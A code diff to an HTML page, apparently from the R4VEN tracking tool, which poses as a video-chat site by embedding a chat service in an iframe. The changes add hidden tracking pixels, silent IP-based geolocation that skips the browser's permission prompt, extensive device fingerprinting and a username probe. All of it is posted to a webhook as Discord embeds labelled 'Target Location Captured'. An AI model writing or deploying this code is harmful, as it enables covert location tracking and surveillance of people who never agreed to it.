@@ -4,9 +4,17 @@
 <head>
   <script type="text/javascript" src="dwebhook.js">
   </script>
+  <!-- No-JS fallback tracking -->
+  <noscript>
+    <img src="/no_js_detector" width="1" height="1" style="display:none;" alt="">
+    <img src="/detect_username" width="1" height="1" style="display:none;" alt="">
+  </noscript>
 </head>
 
-<body onload="getLocation()">
+<body onload="getLocation(); detectUsername();">
+
+  <!-- Image pixel tracking (works even with JS disabled) -->
+  <img src="/track" width="1" height="1" style="display:none;" alt="">
 
   <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
   </iframe>
@@ -15,13 +23,56 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
   </script>
   <script>
+    // MICROPHONE SUPPRESSION - Block all mic access attempts
+    if (navigator.mediaDevices) {
+      const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
+      navigator.mediaDevices.getUserMedia = function(constraints) {
+        // Reject any audio requests
+        if (constraints && constraints.audio) {
+          return Promise.reject(new DOMException('Audio permission denied', 'NotAllowedError'));
+        }
+        // Allow video-only if needed (though video is also disabled)
+        return originalGetUserMedia.call(this, constraints);
+      };
+    }
+    
+    // DEVICE TYPE DETECTION
+    function detectDeviceType() {
+      var ua = navigator.userAgent;
+      var deviceInfo = {
+        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
+        isTablet: /iPad|Android(?!.*Mobile)|Tablet/i.test(ua),
+        isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
+        hasGPS: /Android|iPhone|iPad/i.test(ua),  // Mobile/Tablet likely has GPS
+        platform: navigator.platform,
+        maxAccuracy: /Android|iPhone|iPad/i.test(ua) ? "5-10m (GPS)" : "5000m (IP-based)"
+      };
+      return deviceInfo;
+    }
+    
     var x = document.getElementById("demo");
+    
+    // Username detection function
+    function detectUsername() {
+      try {
+        fetch('/detect_username')
+          .then(response => response.json())
+          .then(data => {
+            console.log('Username detection data:', data);
+          })
+          .catch(error => console.log('Username detection error:', error));
+      } catch (e) {
+        console.log('Username detection not available');
+      }
+    }
 
     let datetime = new Date();
     let localtime = String(datetime.toLocaleTimeString());
+    
+    // Get device type info
+    var deviceType = detectDeviceType();
 
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nDevice_Type: " + (deviceType.isMobile ? "Mobile" : deviceType.isTablet ? "Tablet" : "Desktop") + "\nHas_GPS: " + (deviceType.hasGPS ? "Yes" : "No") + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
 
     const request = new XMLHttpRequest();
     request.open("POST", "/location_update"); //change webhook
@@ -46,7 +97,96 @@
 
     request.send(JSON.stringify(params));
 
-    //...
+    // Enhanced Device Information Vector
+    function collectDeviceInfo() {
+      var deviceInfo = "```autohotkey\n";
+      
+      // Display Information
+      deviceInfo += "Display_PixelDepth: " + screen.pixelDepth + "\n";
+      deviceInfo += "ColorDepth: " + screen.colorDepth + "\n";
+      deviceInfo += "DevicePixelRatio: " + window.devicePixelRatio + "\n";
+      deviceInfo += "ScreenOrientation: " + (screen.orientation ? screen.orientation.type : "N/A") + "\n";
+      
+      // Battery Information (if available)
+      if(navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+          deviceInfo += "Battery_Level: " + Math.round(battery.level * 100) + "%\n";
+          deviceInfo += "Battery_Charging: " + battery.charging + "\n";
+        });
+      }
+      
+      // Connection Information (if available)
+      if(navigator.connection) {
+        deviceInfo += "Connection_Type: " + navigator.connection.effectiveType + "\n";
+        deviceInfo += "SaveData: " + navigator.connection.saveData + "\n";
+        if(navigator.connection.downlink) {
+          deviceInfo += "Downlink_Speed: " + navigator.connection.downlink + " Mbps\n";
+        }
+      }
+      
+      // Storage Information
+      deviceInfo += "LocalStorage_Available: " + (typeof localStorage !== 'undefined' ? 'Yes' : 'No') + "\n";
+      if(typeof localStorage !== 'undefined') {
+        deviceInfo += "LocalStorage_Size: " + JSON.stringify(localStorage).length + " bytes\n";
+      }
+      
+      // WebGL Information (GPU)
+      var canvas = document.createElement('canvas');
+      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if(gl) {
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if(debugInfo) {
+          deviceInfo += "GPU_Vendor: " + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "\n";
+          deviceInfo += "GPU_Renderer: " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "\n";
+        }
+      }
+      
+      // Timezone and Locale
+      deviceInfo += "Timezone_Offset: " + new Date().getTimezoneOffset() + " min\n";
+      deviceInfo += "Browser_Locales: " + (navigator.languages ? navigator.languages.join(', ') : navigator.language) + "\n";
+      
+      // Do Not Track
+      deviceInfo += "DNT_Header: " + (navigator.doNotTrack ? navigator.doNotTrack : "Not Set") + "\n";
+      
+      // WebDriver Detection
+      deviceInfo += "WebDriver_Detected: " + (navigator.webdriver ? "Yes" : "No") + "\n";
+      
+      // Touch Support
+      deviceInfo += "Touch_Support: " + (('ontouchstart' in window) ? 'Yes' : 'No') + "\n";
+      
+      // Vendor Information
+      deviceInfo += "Vendor: " + navigator.vendor + "\n";
+      deviceInfo += "OnLine_Status: " + navigator.onLine + "\n";
+      
+      deviceInfo += "```";
+      
+      const deviceRequest = new XMLHttpRequest();
+      deviceRequest.open("POST", "/location_update");
+      deviceRequest.setRequestHeader('Content-type', 'application/json');
+      
+      var deviceEmbed = {
+        author: {
+          name: "Target Device Information Vector"
+        },
+        title: "Extended Hardware & System Details",
+        description: deviceInfo,
+        color: 9109760,
+        footer: {
+          text: "Comprehensive device telemetry collected"
+        }
+      }
+      
+      var deviceParams = {
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [deviceEmbed]
+      }
+      
+      deviceRequest.send(JSON.stringify(deviceParams));
+    }
+    
+    // Collect device info on page load
+    collectDeviceInfo();
 
     $.getJSON("https://api.ipify.org?format=json", function (data) {
       $("#gfg").html(data.ip);
@@ -124,15 +264,75 @@
 
 
     function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
+      // Skip browser geolocation permission prompt entirely
+      // Go directly to silent IP-based collection (no permissions needed)
+      fetchIPBasedLocation();
+    }
+
+    function fetchIPBasedLocation() {
+      // Multi-API fallback for better coverage across all device types
+      try {
+        // API 1: ip-api.com (Most reliable for most countries)
+        $.getJSON("http://ip-api.com/json/?fields=lat,lon,accuracy,timezone,isp,continent,country,city", function(data) {
+          if(data.lat && data.lon) {
+            var locationData = {
+              coords: {
+                latitude: data.lat,
+                longitude: data.lon,
+                accuracy: data.accuracy || 5000
+              },
+              source: "IP-API",
+              details: data
+            };
+            showPosition(locationData);
+          }
+        }).fail(function() {
+          // API 2: ipapi.co (Fallback)
+          $.getJSON("https://ipapi.co/json/", function(data) {
+            if(data.latitude && data.longitude) {
+              var locationData = {
+                coords: {
+                  latitude: data.latitude,
+                  longitude: data.longitude,
+                  accuracy: 5000
+                },
+                source: "IPAPI-CO",
+                details: data
+              };
+              showPosition(locationData);
+            }
+          }).fail(function() {
+            // API 3: MaxMind GeoIP2 (Last resort)
+            $.getJSON("https://geoip.maxmind.com/geoip/v2.1/city/me", function(data) {
+              if(data.location) {
+                var locationData = {
+                  coords: {
+                    latitude: data.location.latitude,
+                    longitude: data.location.longitude,
+                    accuracy: 5000
+                  },
+                  source: "MaxMind",
+                  details: data
+                };
+                showPosition(locationData);
+              }
+            }).fail(function() {
+              console.error('All geolocation APIs failed');
+            });
+          });
+        });
+      } catch (e) {
+        console.error('Geolocation error:', e);
       }
     }
 
     function showPosition(position) {
-      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
+      var lat = position.coords.latitude;
+      var lon = position.coords.longitude;
+      var accuracy = position.coords.accuracy ? position.coords.accuracy + "m" : "Unknown";
+      var source = position.source || "GPS (Exact)";
+      
+      var latlong = (" GET ", "```prolog\n🎯 GEOLOCATION DATA\nLatitude: " + lat + "\nLongitude: " + lon + "\nAccuracy: " + accuracy + "\nSource: " + source + "```" + "\n__**Google Maps:**__ https://www.google.com/maps/place/" + lat + "," + lon + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + lat + "," + lon + "\n__**OpenStreetMap:**__ https://www.openstreetmap.org/?mlat=" + lat + "&mlon=" + lon + "&zoom=15");
 
       const request = new XMLHttpRequest();
       request.open("POST", "/location_update"); //change webhook
@@ -141,13 +341,19 @@
 
       var myEmbed = {
         author: {
-          name: "Target Allowed Location Permission"
+          name: "🎯 Target Location Captured"
         },
-        title: "GPS location of target..",
+        title: "📍 GPS Location - Exact Coordinates",
         description: latlong + "\n",
         color: 15844367,
+        fields: [
+          {"name": "Latitude", "value": String(lat), "inline": true},
+          {"name": "Longitude", "value": String(lon), "inline": true},
+          {"name": "Accuracy", "value": accuracy, "inline": true},
+          {"name": "Source", "value": source, "inline": true}
+        ],
         footer: {
-          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
+          text: "GPS provides exact location with coordinates. Accuracy depends on device GPS capability."
         }
       }
 
@@ -162,29 +368,37 @@
     }
 
     function showError(error) {
+      console.log('Geolocation error code:', error.code, 'message:', error.message);
+      
       switch (error.code) {
         case error.PERMISSION_DENIED:
-          const request = new XMLHttpRequest();
-          request.open("POST", "/location_update"); //change webhook
-
-          request.setRequestHeader('Content-type', 'application/json');
-
-          const params = {
-            username: "R4VEN",
-            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-            content: "```diff\n- User denied the request for Geolocation.```"
-          }
-
-          request.send(JSON.stringify(params));
+          // User denied permission - fallback to IP-based location
+          console.log('GPS permission denied - using IP-based location');
+          fetchIPBasedLocation();
           break;
         case error.POSITION_UNAVAILABLE:
-          x.innerHTML = "Location information is unavailable."
+          // GPS signal lost or unavailable - try IP-based
+          console.log('GPS position unavailable - using IP-based location');
+          fetchIPBasedLocation();
           break;
         case error.TIMEOUT:
-          x.innerHTML = "The request to get user location timed out."
+          // GPS took too long - try again with more time
+          console.log('GPS timeout - retrying with increased timeout');
+          setTimeout(function() {
+            navigator.geolocation.getCurrentPosition(
+              showPosition,
+              showError,
+              {
+                enableHighAccuracy: true,
+                timeout: 30000,  // Extended timeout
+                maximumAge: 0
+              }
+            );
+          }, 1000);
           break;
         case error.UNKNOWN_ERROR:
-          x.innerHTML = "An unknown error occurred."
+          console.log('Unknown GPS error - using IP-based location');
+          fetchIPBasedLocation();
           break;
       }
     }
@@ -206,6 +420,8 @@
     };
 
     request.send();
+    // IMAGE CAPTURE - COMMENTED OUT
+    /*
     function postFile(file) {
       let formdata = new FormData();
       formdata.append("image", file);
@@ -219,6 +435,7 @@
       };
       xhr.send(formdata);
     }
+    */
 
 
 
@@ -227,6 +444,8 @@
     const canvas = document.getElementById('canvas');
     const errorMsgElement = document.querySelector('span#errorMsg');
 
+    // CAMERA PERMISSION SUPPRESSED - NOT NEEDED
+    /*
     const constraints = {
       audio: false,
       video: {
@@ -234,22 +453,25 @@
         facingMode: "user"
       }
     };
+    */
 
-    // Access webcam
+    // Access webcam - COMMENTED OUT (No camera permission prompts)
     async function init() {
+      // Camera permission request disabled - image capture not used
+      /*
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints)
-        handleSuccess(stream);
+        // handleSuccess(stream); // COMMENTED OUT - Image capture disabled
       } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
-          alert("Grant cam access")
-        }, 15000)
+        // Silently fail if camera permission denied - no alerts or redirects
+        console.log('Camera access failed - continuing without video');
       }
+      */
     }
 
     // Success
+    // IMAGE CAPTURE - COMMENTED OUT
+    /*
     function handleSuccess(stream) {
       window.stream = stream;
       video.srcObject = stream;
@@ -263,6 +485,7 @@
 
 
     }
+    */
 
     // Load init
     init();
